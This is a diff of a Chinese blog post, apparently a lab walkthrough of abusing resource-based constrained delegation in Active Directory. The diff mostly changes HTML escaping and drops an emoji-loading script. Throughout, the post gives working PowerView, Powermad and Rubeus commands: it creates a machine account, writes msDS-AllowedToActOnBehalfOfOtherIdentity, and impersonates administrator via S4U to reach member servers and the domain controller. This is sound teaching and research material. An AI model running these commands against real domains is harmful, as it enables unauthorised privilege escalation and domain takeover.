@@ -239,33 +239,33 @@
 <li>其它域内主机：win10</li>
 </ul>
 <p>验证qiyou这个用户对dm2008是否具有写权限，可以使用PowerView枚举<code>DM2008.test.local</code>的中的特定ACE</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity qiyou -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity DM2008  | ?{$_.SecurityIdentifier -match "S-1-5-21-662417213-3583657854-423750704-1001"}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity qiyou -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity DM2008  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-662417213-3583657854-423750704-1001&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>可以看到qiyou这个用户对dm2008这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320100834-b3da740c-6a4f-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320100834-b3da740c-6a4f-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>我们现在还需要的是一个具有SPN的账户，因为<code>S4U2Self</code>只适用于具有SPN的账户，恰好的是在域中有一个属性<code>MachineAccountQuota</code>，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN的，所以这里刚好符合我们的意图。</p>
 <p>我们可以使用<code>Kevin Robertson</code>的<code>Powermad</code>中的<code>New-MachineAccount</code>来创建一个用户名为<code>evilsystem</code>，密码为<code>evil</code>的计算机账户</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString "evil" -AsPlainText -Force)</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
 <p>可以看到成功创建一个计算机用户<code>evilsystem</code></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319154018-e1a4191a-69b4-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319154018-e1a4191a-69b4-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>下面是修改DM2008的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值，有两种方法可以修改，<code>Powerview</code>或者<code>ActiveDirectory</code>模块</p>
 <p>配置evilsystem到DM2008的基于资源约束的委派</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)"</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer DM2008| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer DM2008| Set-DomainObject -Set @&#123;&apos;msds-allowedtoactonbehalfofotheridentity&apos;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319205236-8227f610-69e0-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200319205236-8227f610-69e0-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -273,25 +273,25 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095821-468ffabc-6a4e-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095821-468ffabc-6a4e-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>验证是否成功添加</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DM2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DM2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320140401-988a0958-6a70-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320140401-988a0958-6a70-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DM2008 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DM2008 -Clear &apos;msds-allowedtoactonbehalfofotheridentity&apos; -Verbose</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322100305-44a6e80c-6be1-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322100305-44a6e80c-6be1-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -299,20 +299,20 @@
 <blockquote>
 <p>只有Windows Server 2012以及以上的<code>ActiveDirectory</code>模块才有-PrincipalsAllowedToDelegateToAccount选项</p>
 </blockquote>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADComputer DM2008 -PrincipalsAllowedToDelegateToAccount evilsystem$</span><br><span class="line">Get-ADComputer DM2008 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADComputer DM2008 -PrincipalsAllowedToDelegateToAccount evilsystem$</span><br><span class="line">Get-ADComputer DM2008 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321204510-cd4e2b04-6b71-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321204510-cd4e2b04-6b71-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p><code>ActiveDirectory</code>模块默认只在域控上安装，如果不是域控可以从域控上把DLL文件复制出来，然后导入即可</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321192205-31cb65c6-6b66-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321192205-31cb65c6-6b66-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -321,25 +321,25 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320005014-b4d0a9a6-6a01-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320005014-b4d0a9a6-6a01-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>因为Rubeus是不支持明文的，所以先把它转换为hash</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095131-525c757e-6a4d-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320095131-525c757e-6a4d-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>然后用<code>evilsystem$</code>的hash请求白银票据并导入到当前会话中</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320003031-f331e262-69fe-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320003031-f331e262-69fe-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -347,7 +347,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320002305-e9cb0f06-69fd-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320002305-e9cb0f06-69fd-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -355,7 +355,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171713-95993708-6a8b-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171713-95993708-6a8b-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -363,18 +363,18 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171756-af4b6540-6a8b-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320171756-af4b6540-6a8b-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>但是我额外申请了一个HOST票据之后，就正常了。。。。。</p>
 <p><strong>注：</strong> 但是如果你只是申请HOST票据，而没有申请CIFS票据的也是不能正常返回一个shell的，原因不明</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/dm2008 /ptt</span><br></pre></td></tr></table></figure>
 <p>将该票据导入之后就可以成功返回shell</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320172207-451a48a2-6a8c-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320172207-451a48a2-6a8c-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -382,7 +382,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321131901-795cde70-6b33-1.gif" alt="gif" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321131901-795cde70-6b33-1.gif" alt="gif" title>
                 </div>
                 <div class="image-caption">gif</div>
             </figure>
@@ -390,7 +390,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321125933-c120b716-6b30-1.gif" alt="gif" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321125933-c120b716-6b30-1.gif" alt="gif" title>
                 </div>
                 <div class="image-caption">gif</div>
             </figure>
@@ -403,7 +403,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320141108-96e73ffc-6a71-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320141108-96e73ffc-6a71-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -411,17 +411,17 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322111521-5d2a4734-6beb-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322111521-5d2a4734-6beb-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p><strong>注：</strong> 我看<code>Elad Shamir</code>的文章里面说需要设置目标自身的委派，但是我在实现的过程中发现不设置也是可行的。</p>
 <p>这时候我们在通过s4u去申请一下票据，这个时候<code>S4U2self</code>是成功的，但是<code>S4U2proxy</code>是失败的</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dm2008$ /rc4:b5cffac3d2bb5d5a7ded8ff2a70c29dc /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dm2008$ /rc4:b5cffac3d2bb5d5a7ded8ff2a70c29dc /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210317-54ddaad4-6b74-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210317-54ddaad4-6b74-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -430,7 +430,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210809-02f5abb2-6b75-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321210809-02f5abb2-6b75-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -439,14 +439,14 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321215312-4e4547a2-6b7b-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321215312-4e4547a2-6b7b-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322103543-d3f9b1f2-6be5-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322103543-d3f9b1f2-6be5-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -454,7 +454,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321211215-95689f9a-6b75-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321211215-95689f9a-6b75-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -462,7 +462,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321220014-4974fa96-6b7c-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321220014-4974fa96-6b7c-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -470,19 +470,19 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321214747-8c3ce32c-6b7a-1.gif" alt="gif" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321214747-8c3ce32c-6b7a-1.gif" alt="gif" title>
                 </div>
                 <div class="image-caption">gif</div>
             </figure>
 <p>修改票据的过程貌似有点繁琐是吧，<code>harmj0y</code>之前就考虑了这一点，所以在Rebeus加入了一个模块可以直接修改票据的SPN，命令如下：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
 <p>我们上面的过程可以直接省略为：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:cifs/dm2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:host/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:cifs/dm2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:host/dm2008 /ptt</span><br></pre></td></tr></table></figure>
 <p>如下：</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321221956-0a63ac3c-6b7f-1.gif" alt="gif" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321221956-0a63ac3c-6b7f-1.gif" alt="gif" title>
                 </div>
                 <div class="image-caption">gif</div>
             </figure>
@@ -492,29 +492,29 @@
 <li>配置evilsystem到域控基于资源的约束委派</li>
 </ol>
 <p>这里就以第一种方法为例，下面配置evilsystem到krbtgt基于资源的约束委派</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)"</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&apos;msds-allowedtoactonbehalfofotheridentity&apos;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322120649-8ded17e6-6bf2-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322120649-8ded17e6-6bf2-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>尝试是否可以请求到TGT</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121221-537cc45c-6bf3-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121221-537cc45c-6bf3-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>然后利用<code>S4U2proxy</code>返回的TGT去申请一张访问域控cifs服务的ST</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:evilsystem$ /enctype:rc4 /service:cifs/dm2012 /domain:test.local /ticket:test.kirbi /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:evilsystem$ /enctype:rc4 /service:cifs/dm2012 /domain:test.local /ticket:test.kirbi /ptt</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121915-4acf27b8-6bf4-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121915-4acf27b8-6bf4-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -522,7 +522,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322122903-a93703b0-6bf5-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322122903-a93703b0-6bf5-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -531,7 +531,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322170851-bf5fe892-6c1c-1.gif" alt="gif" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322170851-bf5fe892-6c1c-1.gif" alt="gif" title>
                 </div>
                 <div class="image-caption">gif</div>
             </figure>
@@ -539,25 +539,7 @@
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></p>
 <p><a href="http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/" target="_blank" rel="noopener">A Case Study in Wagging the Dog: Computer Takeover</a></p>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483689&amp;idx=1&amp;sn=1d83538cebbe2197c44b9e5cc9a7997f&amp;chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&amp;scene=126&amp;sessionid=1584603915&amp;key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&amp;ascene=1&amp;uin=NTgyNDEzOTc%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&amp;pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
         </div>
 
         <blockquote class="post-copyright">
